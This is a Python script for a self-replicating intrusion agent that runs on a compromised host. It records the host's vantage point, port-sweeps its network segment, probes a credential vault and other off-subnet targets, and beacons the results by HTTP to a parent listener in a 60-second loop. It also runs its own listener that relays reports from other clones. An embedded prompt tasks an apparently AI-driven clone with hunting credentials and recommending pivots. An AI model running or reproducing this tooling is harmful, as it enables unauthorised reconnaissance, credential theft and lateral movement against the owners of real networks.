#!/usr/bin/env python3
"""mini-evikit clone: self-contained mesh agent for one compromised host.

Each clone carries its own prompt (CLONE_TASK), knows its own vantage point,
works its own segment, and reports on a contract: what it did, what it got,
what it can see, what it recommends. Clones whose parent is reachable beacon
to that parent's listener; the root clone is read directly by the operator.
"""
import json
import os
import socket
import subprocess
import sys
import threading
import time
import urllib.request

# ---- identity / prompt (rewritten per host at deploy time) -------------------
CLONE_ID = os.environ.get("EVK_CLONE_ID", "clone-unknown")
PARENT = os.environ.get("EVK_PARENT", "operator")
VANTAGE = os.environ.get("EVK_VANTAGE", "")
ZONE = os.environ.get("EVK_ZONE", "dmz")
SEGMENT = os.environ.get("EVK_SEGMENT", "10.99.50.0/24")
REPORT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "report.jsonl")
PARENT_HUB = os.environ.get("EVK_PARENT_HUB", "")
HUB_PORT = int(os.environ.get("EVK_HUB_PORT", "8770"))
BEACON_S = 60
ONCE = "--once" in sys.argv

CLONE_TASK = """
You are {clone}, a mini-evikit running on {vantage} in the {zone} segment.
Your assignment, scoped to what you can see from this position:
 1. Record your own vantage: identity, interfaces, routes, neighbours.
 2. Enumerate your segment {segment} for live hosts and services.
 3. Look for credentials, trust material and any route off this subnet,
    especially toward 10.50.0.0/24 and the vault at 10.50.1.14:8200.
 4. Report on the contract: did / got / see / recommend.
Never act outside {segment} and 10.50.0.0/24.
"""


def run(cmd, timeout=20):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (p.stdout or "").strip(), (p.stderr or "").strip(), p.returncode
    except Exception as exc:
        return "", f"{type(exc).__name__}: {exc}", -1


def emit(event, **fields):
    line = {"ts": time.time(), "clone": CLONE_ID, "parent": PARENT,
            "vantage": VANTAGE, "zone": ZONE, "event": event}
    line.update(fields)
    try:
        with open(REPORT, "a") as fh:
            fh.write(json.dumps(line) + "\n")
    except Exception:
        pass
    if PARENT_HUB:
        try:
            body = json.dumps(line).encode()
            req = urllib.request.Request(PARENT_HUB.rstrip("/") + "/beacon", data=body,
                                         headers={"Content-Type": "application/json"})
            urllib.request.urlopen(req, timeout=5).read()
        except Exception:
            pass


def vantage():
    out = {}
    for key, cmd in (("id", "id"), ("hostname", "hostname"),
                     ("addr", "ip -4 addr show"), ("route", "ip route")):
        out[key] = run(cmd)[0]
    return out


def probe(host, port, timeout=3):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        return True
    except Exception:
        return False
    finally:
        s.close()


def sweep(segment, ports=(22, 80, 443, 445, 3306, 8080, 143, 993, 25, 53, 389, 8200)):
    base = segment.rsplit(".", 1)[0]
    live = []
    for octet in range(1, 255):
        host = f"{base}.{octet}"
        open_ports = [p for p in ports if probe(host, p, 1)]
        if open_ports:
            live.append({"host": host, "ports": open_ports})
        if len(live) >= 40:
            break
    return live


def off_subnet():
    """Can this vantage reach the subsidiary tier / the vault?"""
    checks = {}
    for target in ("10.50.0.11", "10.50.1.14", "10.50.0.100"):
        checks[f"{target}:8200"] = probe(target, 8200, 3)
        checks[f"{target}:22"] = probe(target, 22, 3)
    return checks


def work():
    emit("clone_started", pid=os.getpid(), task=CLONE_TASK.format(
        clone=CLONE_ID, vantage=VANTAGE, zone=ZONE, segment=SEGMENT).strip())
    v = vantage()
    emit("vantage_recorded", **v)
    emit("offsubnet_probe", checks=off_subnet())
    live = sweep(SEGMENT)
    emit("segment_swept", live_count=len(live), live=live)
    emit("report", did="recorded vantage, swept segment, probed off-subnet routes",
         got=[h["host"] for h in live],
         see={"vantage": VANTAGE, "zone": ZONE, "offsubnet": off_subnet()},
         recommend="pivot to the highest-value reachable host in this segment")


def serve():
    from http.server import BaseHTTPRequestHandler, HTTPServer

    class Handler(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_POST(self):
            n = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(n).decode(errors="replace")
            try:
                rec = json.loads(raw)
                rec["received_by"] = CLONE_ID
                with open(REPORT, "a") as fh:
                    fh.write(json.dumps(rec) + "\n")
            except Exception:
                pass
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"ok":true}')

    HTTPServer(("0.0.0.0", HUB_PORT), Handler).serve_forever()


def main():
    if ONCE:
        work()
        return
    threading.Thread(target=serve, daemon=True).start()
    while True:
        try:
            work()
        except Exception as exc:
            emit("clone_error", error=f"{type(exc).__name__}: {exc}")
        time.sleep(BEACON_S)


if __name__ == "__main__":
    main()
